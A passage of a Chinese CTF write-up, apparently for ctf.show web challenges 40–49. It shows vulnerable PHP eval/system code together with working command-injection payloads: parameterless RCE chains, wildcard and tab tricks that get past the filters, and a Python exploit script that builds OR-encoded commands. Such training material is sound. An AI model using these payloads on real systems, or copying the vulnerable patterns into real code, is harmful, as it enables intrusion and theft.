class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了一堆符号但是仔细观察这里过滤的是中文符号……</p><p>所以这里可以使用英文符号</p><p>这里要使用无参数RCE</p><p>参考链接：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8</a></p><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组。其中第一个字符为点</p><p>而点在linux中代表的就是当前目录</p><p><img src="/posts/999021e8/image-20220327200944517.png" alt="image-20220327200944517"></p><p><code>pos()</code> 输出数组中的当前元素的值也就是输出当前指针执行的元素 而指针初始执行第一个元素</p><p><code>pos(localeconv())</code>的输出内容就是点</p><p><code>scandir()</code> 函数返回指定目录中的文件和目录的数组。</p><p><code>scandir(pos(localeconv()))</code>返回当前目录的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><p>查看当前目录有啥</p><p><img src="/posts/999021e8/image-20220327201715160.png" alt="image-20220327201715160"></p><p>可以看到flag.php在倒数第二个位置</p><p><code>array_reverse()</code> 函数以相反的元素顺序返回数组</p><p><code>array_reverse(scandir(pos(localeconv())))</code> 这里就是把flag.php放到第二个位置方便接下来的操作</p><p><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</p><p><code>next(array_reverse(scandir(pos(localeconv()))))</code>到这里指针就指到了flag.php</p><p><code>highlight_file()</code> 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。同时整个文件也会显示出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最终payload</span></span><br><span class="line">?c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line">或者</span><br><span class="line"><span class="comment">#pos()与current()作用相同 readfile()与作用相同highlight_file()</span></span><br><span class="line">?c=<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment">#show_source()与作用相同highlight_file()</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><h3 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>详情可看上文中链接文章</p><p>首先<code>get_defined_vars()</code>函数可以回显全局变量</p><p><img src="/posts/999021e8/image-20220327220213016.png" alt="image-20220327220213016"></p><p>我们想办法把通过这些变量构造RCE 通过&amp;_GET传入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(pos(get_defined_vars()));&amp;sky=123</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221419894.png" alt="image-20220327221419894"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(pos(get_defined_vars())));&amp;sky=123</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220327221518318.png" alt="image-20220327221518318"></p><p>成功取出</p><p>接下来就是构造RCE了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web41"><a href="#Web41" class="headerlink" title="Web41"></a>Web41</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次过滤所有字母和数字以及一堆符号 但是留下了一个或运算符 <code>|</code> </p><p>这里可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p><p>感谢yu22x师傅提供的脚本 <a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可用字符的集合</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用法python exp.py &lt;url&gt;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure><p><img src="/posts/999021e8/image-20220328115853461.png" alt="image-20220328115853461"></p><p>your function输入需要执行的函数</p><p>your command输入需要执行的命令</p><h2 id="We42"><a href="#We42" class="headerlink" title="We42"></a>We42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code>的意思是 将参数返回的结果重定向到黑洞文件</p><blockquote><p>&#x2F;dev&#x2F;null文件可以被看作是一个“黑洞”文件。它等价于一个只写的的文件。所有写入它的内容都会永远丢失(因为不可读)。</p></blockquote><p>这里我们可以使用双命令绕过,使第一条命令执行，第二条命令被重定向到黑洞文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php;</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了cat和；</p><p>使用 | 代替；</p><p>cat用nl或者tac代替</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl flag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>又过滤了flag</p><p>可以使用通配符绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl fla*||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了空格的过滤</p><p>用%09或者&lt;绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fla*||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多过滤了$ * 和数字</p><p>使用?绕过对*的过滤</p><blockquote><p><code>&quot;?&quot;和&quot;*&quot;的区别：</code></p><p><code>?只能通配某个字符，如flag.php -&gt; fla?.php fl??.ph?</code></p><p><code>*可以通配整个字符串，如flag.php -&gt; f*</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>这里%09还能用是因为参数验证前进行了url解码 %09 变成了tab字符</p><p>查看源代码获取flag</p><h2 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了more less head sort tail</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了sed cut awk strings od curl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><h2 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>多了&#96; 和 %</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl%09fl?g.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web50"><a href="#Web50" class="headerlink" 